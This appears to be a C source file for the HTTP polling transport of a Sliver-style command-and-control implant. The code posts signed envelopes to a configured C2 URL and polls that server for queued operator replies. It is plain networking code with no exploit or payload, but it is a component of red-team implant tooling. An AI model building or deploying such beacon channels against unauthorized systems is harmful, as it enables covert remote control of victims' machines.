/* src/transport/channel_http.c - POLL channel over HTTP/1.1.
 *
 * One request carries one signed envelope; the response body carries at most one
 * reply envelope. That is exactly how Sliver's HTTP transport behaves (the Go
 * client posts an envelope and reads the response), so a scheduler keeps calling
 * send()/recv() and never learns the link is request/response instead of duplex.
 *
 * send(): POST the envelope, queue any reply frame found in the response body.
 * recv(): pop the queue; when empty, POST an empty body (a poll) once and pop.
 * Returning -1 (not 1) when a poll yields nothing keeps the session loop alive.
 *
 * https:// is not wired up yet (needs a TLS client that does not require a client
 * certificate); sliver_channel_dial reports that explicitly.
 */
#include "sliver/channel.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/frame.h"
#include "sliver/log.h"
#include "sliver/platform.h"

#define SLIVER_HTTP_MAX_REPLY 4
#define SLIVER_HTTP_CONNECT_TIMEOUT_MS 10000
#define SLIVER_HTTP_RECV_TIMEOUT_MS 15000
#define SLIVER_HTTP_MAX_RESPONSE (4u * 1024u * 1024u)

typedef struct {
  char host[256];
  uint16_t port;
  char path[512];
  const char *server_pubkey;
  sliver_frame_signer_t signer;
  sliver_buf_t queued[SLIVER_HTTP_MAX_REPLY];
  size_t queued_count;
  volatile int closed;
  int requests;
} http_channel_t;

/* --- memory reader for frame parsing -------------------------------------- */
typedef struct {
  const unsigned char *data;
  size_t len;
  size_t off;
} mem_reader_t;

static long mem_read(void *ctx, void *buf, size_t want) {
  mem_reader_t *r = (mem_reader_t *)ctx;
  size_t avail = r->len - r->off;
  size_t take = want < avail ? want : avail;
  if (take == 0) {
    return -1;
  }
  memcpy(buf, r->data + r->off, take);
  r->off += take;
  return (long)take;
}

/* --- memory writer for frame building ------------------------------------ */
typedef struct {
  unsigned char *data;
  size_t len;
  size_t cap;
  int failed;
} mem_writer_t;

static long mem_write(void *ctx, const void *buf, size_t len) {
  mem_writer_t *w = (mem_writer_t *)ctx;
  if (w->failed) {
    return -1;
  }
  if (w->len + len > w->cap) {
    size_t want = w->cap == 0 ? 4096 : w->cap;
    unsigned char *grown;
    while (want < w->len + len) {
      want *= 2;
    }
    grown = (unsigned char *)realloc(w->data, want);
    if (grown == NULL) {
      w->failed = 1;
      return -1;
    }
    w->data = grown;
    w->cap = want;
  }
  memcpy(w->data + w->len, buf, len);
  w->len += len;
  return (long)len;
}

/* --- request/response ---------------------------------------------------- */
static int http_roundtrip(http_channel_t *h, const void *body, size_t body_len,
                          unsigned char **out_body, size_t *out_len) {
  sliver_socket_t *sock;
  char head[768];
  int head_len;
  size_t sent = 0;
  size_t total = 0;
  unsigned char *buf = NULL;
  size_t cap = 0;
  const unsigned char *sep;
  size_t header_len;

  *out_body = NULL;
  *out_len = 0;

  sock = sliver_tcp_connect(h->host, h->port);
  if (sock == NULL) {
    LOG_WARN("http: cannot connect to %s:%u", h->host, (unsigned)h->port);
    return -1;
  }
  sliver_socket_set_recv_timeout(sock, SLIVER_HTTP_RECV_TIMEOUT_MS);
  sliver_socket_set_send_timeout(sock, SLIVER_HTTP_CONNECT_TIMEOUT_MS);

  head_len = snprintf(head, sizeof(head),
                      "POST %s HTTP/1.1\r\n"
                      "Host: %s:%u\r\n"
                      "Content-Type: application/octet-stream\r\n"
                      "Content-Length: %u\r\n"
                      "Connection: close\r\n"
                      "\r\n",
                      h->path[0] != '\0' ? h->path : "/", h->host, (unsigned)h->port,
                      (unsigned)body_len);
  if (head_len <= 0 || (size_t)head_len >= sizeof(head)) {
    sliver_socket_close(sock);
    return -1;
  }
  while (sent < (size_t)head_len) {
    long n = sliver_socket_send(sock, head + sent, (size_t)head_len - sent);
    if (n <= 0) {
      sliver_socket_close(sock);
      return -1;
    }
    sent += (size_t)n;
  }
  sent = 0;
  while (body_len != 0 && sent < body_len) {
    long n = sliver_socket_send(sock, (const unsigned char *)body + sent, body_len - sent);
    if (n <= 0) {
      sliver_socket_close(sock);
      return -1;
    }
    sent += (size_t)n;
  }

  /* Read the whole response (Connection: close means EOF terminates it). */
  for (;;) {
    long n;
    if (total + 4096 > cap) {
      size_t want = cap == 0 ? 8192 : cap * 2;
      unsigned char *grown;
      if (want > SLIVER_HTTP_MAX_RESPONSE) {
        break;
      }
      grown = (unsigned char *)realloc(buf, want);
      if (grown == NULL) {
        free(buf);
        sliver_socket_close(sock);
        return -1;
      }
      buf = grown;
      cap = want;
    }
    n = sliver_socket_recv(sock, buf + total, cap - total);
    if (n <= 0) {
      break;
    }
    total += (size_t)n;
  }
  sliver_socket_close(sock);

  if (total == 0 || buf == NULL) {
    free(buf);
    return -1;
  }

  /* Split headers from body. */
  sep = NULL;
  {
    size_t i;
    for (i = 3; i < total; ++i) {
      if (buf[i - 3] == '\r' && buf[i - 2] == '\n' && buf[i - 1] == '\r' && buf[i] == '\n') {
        sep = buf + i + 1;
        break;
      }
    }
  }
  if (sep == NULL) {
    free(buf);
    LOG_WARN("http: malformed response (no header terminator)");
    return -1;
  }
  header_len = (size_t)(sep - buf);
  if (header_len < 12 || memcmp(buf, "HTTP/1.", 7) != 0) {
    free(buf);
    LOG_WARN("http: malformed status line");
    return -1;
  }
  if (buf[9] != '2') { /* only 2xx carries a reply envelope */
    LOG_DEBUG("http: status %c%c%c", buf[9], buf[10], buf[11]);
    free(buf);
    return 0;
  }

  /* Hand the raw body back: the frame parser needs the bytes unchanged. */
  {
    size_t body_size = total - header_len;
    if (body_size == 0) {
      free(buf);
      return 0;
    }
    *out_body = (unsigned char *)malloc(body_size);
    if (*out_body == NULL) {
      free(buf);
      return -1;
    }
    memcpy(*out_body, sep, body_size);
    *out_len = body_size;
  }
  free(buf);
  return 0;
}

/* Parses one frame out of raw response bytes into a fresh envelope buffer. */
static int http_take_frame(http_channel_t *h, const unsigned char *data, size_t len,
                           sliver_buf_t *out) {
  mem_reader_t r;
  int rc;

  sliver_buf_init(out);
  if (len == 0) {
    return 1; /* nothing carried by this response */
  }
  r.data = data;
  r.len = len;
  r.off = 0;
  rc = sliver_frame_read(h->server_pubkey, mem_read, &r, out);
  if (rc != 0) {
    LOG_WARN("http: bad frame in response (rc=%d, %u bytes)", rc, (unsigned)len);
    sliver_buf_free(out);
    sliver_buf_init(out);
    return -1;
  }
  return 0;
}

static int http_queue(http_channel_t *h, sliver_buf_t *env) {
  if (h->queued_count >= SLIVER_HTTP_MAX_REPLY) {
    sliver_buf_free(env);
    LOG_WARN("http: reply queue full, dropping a frame");
    return -1;
  }
  h->queued[h->queued_count++] = *env;
  return 0;
}

/* --- channel vtable ------------------------------------------------------ */
static const char *http_describe(sliver_channel_t *c) {
  (void)c;
  return "http/1.1 (poll)";
}

static int http_send(sliver_channel_t *c, const void *envelope, size_t len) {
  http_channel_t *h = (http_channel_t *)c->state;
  unsigned char *body = NULL;
  size_t body_len = 0;
  sliver_buf_t reply;
  mem_writer_t frame;
  int rc;

  if (h->closed) {
    return -1;
  }
  /* The scheduler hands us an Envelope; the wire carries a signed frame, exactly
   * like mTLS. */
  memset(&frame, 0, sizeof(frame));
  if (sliver_frame_write(&h->signer, mem_write, &frame, envelope, len) != 0 ||
      frame.data == NULL) {
    free(frame.data);
    LOG_ERROR("http: cannot sign envelope");
    return -1;
  }
  rc = http_roundtrip(h, frame.data, frame.len, &body, &body_len);
  free(frame.data);
  if (rc != 0) {
    return -1;
  }
  h->requests++;
  rc = http_take_frame(h, body, body_len, &reply);
  free(body);
  if (rc == 0) {
    (void)http_queue(h, &reply);
  }
  /* The request itself succeeded: a response without a body is normal (204). */
  return 0;
}

static int http_recv(sliver_channel_t *c, sliver_buf_t *env_out) {
  http_channel_t *h = (http_channel_t *)c->state;
  unsigned char *body = NULL;
  size_t body_len = 0;
  sliver_buf_t reply;
  int rc;

  if (h->closed) {
    return 1;
  }
  if (h->queued_count > 0) {
    *env_out = h->queued[0];
    memmove(&h->queued[0], &h->queued[1], (h->queued_count - 1) * sizeof(h->queued[0]));
    h->queued_count--;
    sliver_buf_init(&h->queued[h->queued_count]);
    return 0;
  }
  /* Nothing queued: poll with an empty body. */
  if (http_roundtrip(h, NULL, 0, &body, &body_len) != 0) {
    sliver_buf_init(env_out);
    return -1; /* link problem but not fatal: the caller keeps looping */
  }
  h->requests++;
  rc = http_take_frame(h, body, body_len, &reply);
  free(body);
  if (rc != 0) {
    sliver_buf_init(env_out);
    return -1;
  }
  *env_out = reply;
  return 0;
}

static int http_poll(sliver_channel_t *c, const sliver_buf_t *out, size_t out_count,
                     sliver_buf_t *in, size_t in_cap, size_t *in_count) {
  (void)c;
  (void)out;
  (void)out_count;
  (void)in;
  (void)in_cap;
  if (in_count != NULL) {
    *in_count = 0;
  }
  return -1; /* callers use send()/recv(); the batch API is for DNS/WG later */
}

static void http_close(sliver_channel_t *c) {
  http_channel_t *h = (http_channel_t *)c->state;
  size_t i;
  if (h == NULL || h->closed) {
    return;
  }
  h->closed = 1;
  for (i = 0; i < h->queued_count; ++i) {
    sliver_buf_free(&h->queued[i]);
  }
  h->queued_count = 0;
}

int sliver_channel_http_dial(const char *c2_url, const char *age_private_key,
                             const char *server_minisign_pubkey, sliver_channel_t **out,
                             char *err, size_t err_len) {
  sliver_channel_t *c;
  http_channel_t *h;
  const char *p;
  const char *slash;
  const char *colon;
  size_t host_len;

  if (out == NULL) {
    return -1;
  }
  *out = NULL;
  if (c2_url == NULL || strncmp(c2_url, "http://", 7) != 0) {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: bad C2 URL");
    }
    return -1;
  }
  if (server_minisign_pubkey == NULL) {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: missing server public key");
    }
    return -1;
  }
  if (age_private_key == NULL) {
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: missing envelope signing key");
    }
    return -1;
  }

  c = (sliver_channel_t *)calloc(1, sizeof(*c));
  h = (http_channel_t *)calloc(1, sizeof(*h));
  if (c == NULL || h == NULL) {
    free(c);
    free(h);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: out of memory");
    }
    return -1;
  }

  p = c2_url + 7;
  slash = strchr(p, '/');
  colon = strrchr(p, ':');
  if (colon == NULL || (slash != NULL && colon > slash)) {
    h->port = 80;
    host_len = slash != NULL ? (size_t)(slash - p) : strlen(p);
  } else {
    h->port = (uint16_t)strtoul(colon + 1, NULL, 10);
    host_len = (size_t)(colon - p);
  }
  if (host_len == 0 || host_len >= sizeof(h->host)) {
    free(h);
    free(c);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: bad host in URL");
    }
    return -1;
  }
  memcpy(h->host, p, host_len);
  h->host[host_len] = '\0';
  (void)snprintf(h->path, sizeof(h->path), "%s", slash != NULL ? slash : "/");
  h->server_pubkey = server_minisign_pubkey;
  if (sliver_frame_signer_init(&h->signer, age_private_key) != 0) {
    free(h);
    free(c);
    if (err != NULL && err_len != 0) {
      (void)snprintf(err, err_len, "%s", "http: cannot derive envelope signing key");
    }
    return -1;
  }

  c->kind = SLIVER_CHANNEL_POLL;
  c->describe = http_describe;
  c->send = http_send;
  c->recv = http_recv;
  c->poll = http_poll;
  c->close = http_close;
  c->state = h;

  *out = c;
  return 0;
}
